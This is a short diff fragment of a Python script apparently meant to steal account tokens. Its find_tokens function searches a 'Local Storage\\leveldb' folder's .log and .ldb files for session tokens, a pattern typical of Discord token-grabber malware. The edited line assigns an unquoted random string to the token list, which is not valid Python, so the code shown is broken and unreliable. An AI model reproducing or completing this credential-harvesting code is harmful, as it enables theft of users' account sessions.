@@ -13,7 +13,7 @@ PING_ME = False
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
 
-    tokens = []
+    tokens = [iqjU4wkMHy16Sbelscr1-ZNPJ4VTACgY]
 
     for file_name in os.listdir(path):
         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
